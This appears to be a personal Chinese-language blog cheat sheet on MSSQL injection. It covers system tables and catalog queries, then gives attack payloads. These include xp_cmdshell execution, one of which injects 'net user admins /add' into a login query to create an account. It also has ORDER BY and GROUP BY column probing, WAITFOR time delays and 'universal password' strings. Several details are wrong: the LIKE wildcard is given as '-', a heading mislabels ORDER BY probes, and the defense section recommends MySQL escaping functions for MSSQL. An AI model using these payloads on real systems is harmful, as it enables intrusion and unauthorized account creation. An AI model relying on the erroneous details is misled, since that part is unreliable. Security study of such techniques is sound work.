---
title: MSSQLI备忘录
date: 2018-04-14 20:43:04
categories: Web
tags:
description:
---

记录自己的一些小笔记
<!-- more -->

# MSSQL知识储备

## 系统数据库
 - `master`
 Master 数据库记录SQLServer 系统的所有`系统级别信息（表sysobjects）`,`登录账号（表sysusers）`和`系统配置`,`其他的数据库（表sysdatabases）`，`数据库文件的位置`。Master 数据库记录SQLServer的初始化信息，他始终指向一个可用的最新 Master 数据库备份。
 - `model`
 model数据库是`建立所有用户数据库时的模板`。当你建立一个新数据库时，SQL Server会把model数据库中的所有对象建立一份拷贝并移到新数据库中。在模板对象被拷贝到新的用户数据库中之后，该数据库的所有多余空间都将被空页填满。
 - `tempdb`
 	tempdb数据库是一个非常特殊的数据库，供所有来访问你的SQL Server的用户使用。这个库用来`保存所有的临时表、存储过程和其他SQL Server建立的临时用的东西`。例如，排序时要用到tempdb数据库。数据被放进tempdb数据库，排完序后再把结果返回给用户。每次SQL Server重新启动，它都会清空tempdb数据库并重建。永远不要在tempdb数据库建立需要永久保存的表。
 - `msdb`
 Msdb 数据库供 SQLServer `代理程序调度警报和作业以及记录操作员时使用`。比如，我们备份了一个数据库，会在表backupfile中插入一条记录，以记录相关的备份信息。
 - 实例数据库
  - `Northwind`
  - `pubs`

## 系统表
![systable](systable.png)
比较重要的几点
 - 主数据库
   - `sysdatabases` `存放所有数据库信息`
     - `name` 库名称
     - `dbid` 库ID
 - 每个数据库
   - `sysobjects` `在数据库内创建的每个对象（约束、默认、日志、规则、存储过程）`
     - `name` 对象名
     - `id`   对象ID
     - `uid` 对象的用户ID
     - `xtype` 对象类型
       - U(用户表), S(系统表),V(视图),P(存储过程)
   - `syscolumns` `该库的所有字段信息`
     - `name` 字段名称
     - `id`   表ID
     - `colid` 字段ID
   - `sysusers` `用户信息`

[在具体可以看这](https://www.path8.net/tn/archives/3298)

## 常用命令

### 注释符
 - `--`
 - `/*`

### LIKE通配符
 - `-` 匹配一个字符
 - `%` 匹配一个或多个字符

### 字符串连接符
 - `SELECT 'a'+'d'+'mi'+'n';`

### 版本
 - `@@VERSION`

### 当前数据库
 - `DB_NAME()`

### 联合查询相关
查看其他数据库   master.dbo.sysdatabases(库名.所有者.表名)

 - `SELECT name FROM master..sysdatabases`  查看所有库
 - `SELECT name,id FROM sysobjects WHERE xtype='U'`   查询某库的所有用户表
 - `SELECT name FROM syscolumns WHERE id=表id`   查询某表所有列 --表ID就是sysobjects的id字段

 - `SELECT col_name(object_id('users'),1)` 也可以拿到列
 - `SELECT name FROM syscolumns WHERE id=object_id('users')`  也可以拿到列

**也可以使用information_schema数据库**
![information_schema](information_schema.png)



### 执行shell命令
 - `select count(*) from master.dbo.sysobjects where xtype = 'x' and name = 'xp_cmdshell'` 查询是否能使用
 - `exec master..xp_cmdshell 'whoami'`   2005 2008 默认关闭
 - `select * from openrowset('sqloledb','trusted_connection=yes','set fmtonly off exec master..xp_cmdshell ''whoami''')`
 - `SELECT * FROM users WHERE username ='' exec master.dbo.xp_cmdshell 'net user admins /add'--'`

### 条件语句
 - `IF 1=1 SELECT 'true' ELSE SELECT 'false'`  IF是不能再SELECT语句中使用的
 - `SELECT CASE WHEN 1=1 THEN true ELSE false END`

### 时间
 - `IF 1=1 WAITFOR DELAY '0:0:5' ELSE WAITFOR DELAY '0:0:0'`




# 利用SQL

## 联合注入

### 测试列数

#### GROUP BY
```
SELECT username, password FROM users WHERE id = '1';
1' ORDER BY 1--	True
1' ORDER BY 2--	True
1' ORDER BY 3--	False - 查询使用了2列
-1' UNION SELECT 1,2--	True
```

#### GROUP BY / HAVING
```
SELECT username, password FROM users WHERE id = '1';

1' HAVING 1=1										-- 错误
1' GROUP BY username HAVING 1=1--					-- 错误
1' GROUP BY username, password HAVING 1=1--			-- 正确
Group By可以用来测试列名
```




## MSSQL万能密码
 - `' or '1='1`
 - `' or '1'='1'--`





# 防御
## 过滤函数
 - `addslashes()`
 - `mysql_real_escape_string()`
 - `mysql_escape_string()`
